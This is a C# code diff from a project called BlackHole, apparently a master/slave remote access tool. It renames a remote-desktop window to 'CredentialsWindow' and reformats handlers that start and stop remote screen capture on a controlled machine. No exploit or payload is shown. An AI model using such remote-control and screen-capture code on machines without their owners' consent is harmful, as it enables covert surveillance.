@@ -3,19 +3,25 @@ using System.Windows;
 using System.Windows.Media.Imaging;
 using BlackHole.Common;
 using BlackHole.Common.Network.Protocol;
+using BlackHole.Master.Extentions;
 
 namespace BlackHole.Master
 {
     /// <summary>
-    /// 
+    /// Logique d'interaction pour RemoteDesktop.xaml
     /// </summary>
-    public partial class RemoteDesktop
+    public partial class CredentialsWindow : SlaveWindow
     {
+        public CredentialsWindow()
+        {
+            InitializeComponent();
+        }
+
         /// <summary>
         /// 
         /// </summary>
         /// <param name="slave"></param>
-        public RemoteDesktop(Slave slave) 
+        public CredentialsWindow(Slave slave)
             : base(slave)
         {
             InitializeComponent();
@@ -29,34 +35,31 @@ namespace BlackHole.Master
         /// </summary>
         /// <param name="sender"></param>
         /// <param name="e"></param>
-        private void OnStartCapture(object sender, RoutedEventArgs e)
-            => StartCapture(0, int.Parse(TxtBoxQuality.Text), int.Parse(TxtBoxRate.Text));
+        private void OnStartCapture(object sender, RoutedEventArgs e) =>
+            StartCapture(0, int.Parse(TxtBoxQuality.Text), int.Parse(TxtBoxRate.Text));
 
         /// <summary>
         /// 
         /// </summary>
         /// <param name="sender"></param>
         /// <param name="e"></param>
-        private void OnStopCapture(object sender, RoutedEventArgs e)
-            => StopCapture();
+        private void OnStopCapture(object sender, RoutedEventArgs e) => StopCapture();
 
         /// <summary>
         /// 
         /// </summary>
-        private void StartCapture(int screen = 0, int quality = 10, int rate = 10) =>
-            Send(new StartScreenCaptureMessage
-            {
-                Quality = quality,
-                Rate = rate,
-                ScreenNumber = screen
-            });
+        private void StartCapture(int screen = 0, int quality = 10, int rate = 10) => Send(new StartScreenCaptureMessage
+        {
+            Quality = quality,
+            Rate = rate,
+            ScreenNumber = screen
+        });
 
         /// <summary>
         /// 
         /// </summary>
-        private void StopCapture() =>
-            Send(new StopScreenCaptureMessage());
-        
+        private void StopCapture() => Send(new StopScreenCaptureMessage());
+
         /// <summary>
         /// 
         /// </summary>
@@ -97,11 +100,11 @@ namespace BlackHole.Master
             {
                 switch ((SlaveEventType)ev.EventType)
                 {
-                    case SlaveEventType.INCOMMING_MESSAGE:
-                        ev.Data
-                            .Match()
-                            .With<ScreenCaptureMessage>(UpdateScreenCapture);
+                    case SlaveEventType.IncommingMessage:
+                    {
+                        ev.Data.Match().With<ScreenCaptureMessage>(UpdateScreenCapture);
                         break;
+                    }
                 }
             });
         }
